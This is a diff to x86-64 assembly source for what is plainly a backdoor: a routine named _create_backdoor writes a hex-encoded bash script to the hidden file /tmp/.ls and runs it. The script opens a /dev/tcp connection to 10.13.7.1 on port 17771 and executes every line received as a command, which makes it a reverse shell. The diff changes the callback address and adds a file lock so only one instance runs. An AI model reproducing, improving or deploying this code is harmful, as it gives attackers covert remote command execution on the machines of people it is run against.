@@ -6,7 +6,7 @@ section .text
 
 _script_file:
 	.name db '/tmp/.ls', 0
-	.content db 0x23,0x21,0x2f,'bin',0x2f,'bash',10,'exec 5',0x3c,0x3e,0x2f,'dev',0x2f,'tcp',0x2f,'10.13.6.1',0x2f,'17771',0x3b,'cat ',0x3c,0x26,'5 ',0x7c,' while read line',0x3b,' do ',0x24,'line 2',0x3e,0x26,'5 ',0x3e,0x26,'5',0x3b,' done'
+	.content db 0x23,0x21,0x2f,'bin',0x2f,'bash',10,'exec 5',0x3c,0x3e,0x2f,'dev',0x2f,'tcp',0x2f,'10.13.7.1',0x2f,'17771',0x3b,'cat ',0x3c,0x26,'5 ',0x7c,' while read line',0x3b,' do ',0x24,'line 2',0x3e,0x26,'5 ',0x3e,0x26,'5',0x3b,' done'
 	.content_len equ $ - _script_file.content
 	.verif_proc_name db '.ls', 10, 0
 
@@ -46,6 +46,12 @@ _create_backdoor:
 	cmp rax, 0
 	jl _backdoor_ret
 	mov QWORD [rsp], rax
+	mov rax, SYS_FLOCK
+	mov rdi, QWORD [rsp]
+	mov rsi, LOCK_EX | LOCK_NB
+	syscall
+	cmp rax, 0
+	jne _close_then_ret
 
 ; Write content on this file
 	mov rax, SYS_WRITE
@@ -64,6 +70,13 @@ _create_backdoor:
 	syscall
 	cmp rax, 0
 	je _child_exec
+	jmp _backdoor_ret
+
+_close_then_ret:
+; Then close our file
+	mov rax, SYS_CLOSE
+	mov rdi, QWORD [rsp]
+	syscall
 
 _backdoor_ret:
 	leave
